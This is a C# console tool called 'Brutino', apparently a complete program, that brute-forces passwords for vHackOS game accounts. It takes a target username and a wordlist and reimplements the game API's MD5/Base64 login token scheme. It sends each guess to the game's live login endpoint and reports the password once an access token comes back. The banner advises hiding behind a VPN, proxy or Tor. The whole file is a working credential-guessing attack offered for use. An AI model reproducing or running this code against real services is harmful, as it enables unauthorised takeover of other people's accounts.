using System;
using System.Net;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Web;
using System.Threading;
using System.Text;

namespace Brutino
{
    class MainClass
    {
        public static string CalculateMD5Hash(string input)

        {

            // step 1, calculate MD5 hash from input

            MD5 md5 = System.Security.Cryptography.MD5.Create();

            byte[] inputBytes = System.Text.Encoding.ASCII.GetBytes(input);

            byte[] hash = md5.ComputeHash(inputBytes);

            // step 2, convert byte array to hex string

            StringBuilder sb = new StringBuilder();

            for (int i = 0; i < hash.Length; i++)

            {

                sb.Append(hash[i].ToString("x2"));

            }

            return sb.ToString();

        }

        public static void initial()
        {
            Console.Title = "Brutino Vhackos bruteforcer";
            Console.BackgroundColor = ConsoleColor.Black;
            Console.Clear();

            Console.ForegroundColor = ConsoleColor.DarkGreen;
            string gg = "" +
                "+-----------------------------------------------------------------------------+\n" +
                "| _    ____               __                 ____             __              |\n" +
                "|| |  / / /_  ____ ______/ /______  _____   / __ )_______  __/ /____  _____   |\n" +
                "|| | / / __ \\/ __ `/ ___/ //_/ __ \\/ ___/  / __  / ___/ / / / __/ _ \\/ ___/   |\n" +
                "|| |/ / / / / /_/ / /__/ ,< / /_/ (__  )  / /_/ / /  / /_/ / /_/  __/ /       |\n" +
                "||___/_/ /_/\\__,_/\\___/_/|_|\\____/____/  /_____/_/   \\__,_/\\__/\\___/_/        |\n" +
                "|                                                                             |\n" +
                "| Simple bruteforcer for vhackos accounts                                     |\n" +
                "| Coded By Angelo Rosa 2018                                                   |\n" +
                "| Use a Vpn or Proxy or Tor before to start the script                        |\n" +
                "+-----------------------------------------------------------------------------+\n";

            Console.Write(gg);
            Console.ForegroundColor = ConsoleColor.White;
        }

        public static void table_trying(string ip , string username , string line, int count, int tried){
            Console.Clear();
            initial();
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\n\t Your Ip\t");
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine(ip);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Account\t");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("{0}", username);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Trying\t\t");
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine(line);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Password count\t");
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(count);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Tried\t");
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.WriteLine(tried);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Progress\t");
            Console.ForegroundColor = ConsoleColor.Blue;
            double dProgress = ((double)tried / (double)count) * 100.0;
            Console.WriteLine((int)dProgress + "%");

        }

        public static void table_found(string username, double elapsed, string password)
        {
            Console.Clear();
            initial();
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\n\t Account\t");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("{0}", username);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Status Password\t");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine("Found!");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Password\t");
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(password);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Elapsed time\t");
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(elapsed + "minutes");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("\n\n Type a key to exit");
            Console.ReadLine();
            System.Environment.Exit(1);

        }

        public static void table_not_found(string username, double elapsed)
        {
            Console.Clear();
            initial();
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\n\t Account\t\t");
            Console.ForegroundColor = ConsoleColor.DarkRed;
            Console.WriteLine("{0}", username);
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Status Password\t");
            Console.ForegroundColor = ConsoleColor.Red;
            Console.WriteLine("Not Found!");
            Console.ForegroundColor = ConsoleColor.White;
            Console.Write("\t Elapsed time\t\t");
            Console.ForegroundColor = ConsoleColor.Magenta;
            Console.WriteLine(elapsed + "minutes");
            Console.ForegroundColor = ConsoleColor.White;
            Console.WriteLine("\n\n Type a key to exit");
            Console.ReadLine();
            System.Environment.Exit(1);

        }

        public static string Base64Encode(string plainText)
        {
            var plainTextBytes = System.Text.Encoding.UTF8.GetBytes(plainText);
            return System.Convert.ToBase64String(plainTextBytes);
        }


        public static void Main(string[] args)
        {
            initial();
            int count = 0, tried = 0;
            string respond, ip, size;

            string api = "https://api.vhack.cc/mobile/15/login.php",wordlist;
            string api_ip = "https://ident.me";

            HttpWebRequest rew = (HttpWebRequest)WebRequest.Create(api_ip);
            rew.AutomaticDecompression = DecompressionMethods.GZip;

            using (HttpWebResponse res = (HttpWebResponse)rew.GetResponse())
            using (Stream str = res.GetResponseStream())
            using (StreamReader read = new StreamReader(str))
            {
                respond = read.ReadToEnd();
            }

            ip = respond;


            Console.Write("Username=> ");
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            string username = Console.ReadLine();

            do
            {
                Console.ForegroundColor = ConsoleColor.White;
                Console.Write("Wordlist patch=> ");
                Console.ForegroundColor = ConsoleColor.DarkYellow;
                wordlist = Console.ReadLine();

                if (!File.Exists(wordlist)){
                    Console.ForegroundColor = ConsoleColor.Red;
                    Console.WriteLine("Wordlist not found, try again");
                    Console.ForegroundColor = ConsoleColor.White;
                }

            } while (!File.Exists(wordlist));

            Console.WriteLine(wordlist);

            var watch_for_this = System.Diagnostics.Stopwatch.StartNew();

            string hash, jasonString, jasonBased, md5_jason_1, password, req, url;


            string String = ("{\"username\":\"#replace#\", \"password\":\"#replace2#\",\"lastread\":\"0\",\"lang\":\"it\",\"verify\":\"False\"}");

            try
            {
                StreamReader file = new StreamReader(wordlist);

                while ((size = file.ReadLine()) != null)
                {
                    count++;
                }

                using (var reader = new StreamReader(wordlist))
                {
                    while (!reader.EndOfStream)
                    {
                        hash = string.Empty;
                        jasonString = string.Empty;
                        jasonBased = string.Empty;
                        md5_jason_1 = string.Empty;
                        password = string.Empty;
                        req = string.Empty;
                        try
                        {
                            var line = reader.ReadLine();

                            tried++;

                            table_trying(ip, username, line, count, tried);
                              
                            hash = CalculateMD5Hash(line);
                            jasonString = String.Replace("#replace#", username).Replace("#replace2#", hash);

                            jasonBased = Base64Encode(jasonString);

                            md5_jason_1 = CalculateMD5Hash(jasonString);

                            password = CalculateMD5Hash(jasonString + jasonString + md5_jason_1);

                            string html = string.Empty;
                            req = "?user=#replace3#&pass=#replace4#";

                            url = api + req.Replace("#replace3#", jasonBased).Replace("#replace4#", password);

                            Thread.Sleep(300);

                            HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);
                            request.AutomaticDecompression = DecompressionMethods.GZip;

                            using (HttpWebResponse response = (HttpWebResponse)request.GetResponse())
                            using (Stream stream = response.GetResponseStream())
                            using (StreamReader reader_2 = new StreamReader(stream))
                            {
                                html = reader_2.ReadToEnd();
                            }


                            if (html.Contains("accesstoken") && html.Contains("uid")){
                                watch_for_this.Stop();
                                var ela = watch_for_this.Elapsed.TotalMinutes;
                                table_found(username, ela, line);
                            }



                        }
                        catch (Exception)
                        {
                            Console.ForegroundColor = ConsoleColor.Red;
                            Console.WriteLine("Unable to send requests anymore stopping.....\n");
                            System.Environment.Exit(3);
                        }

                    }
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("Exception Occurred... Stopping. Wordlist format not accepted\n{0}", ex);
                Console.ReadLine();
                System.Environment.Exit(0);
            }

            watch_for_this.Stop();
            var elapsed = watch_for_this.Elapsed.TotalMinutes;
            table_not_found(username , elapsed);
        }
    }
}
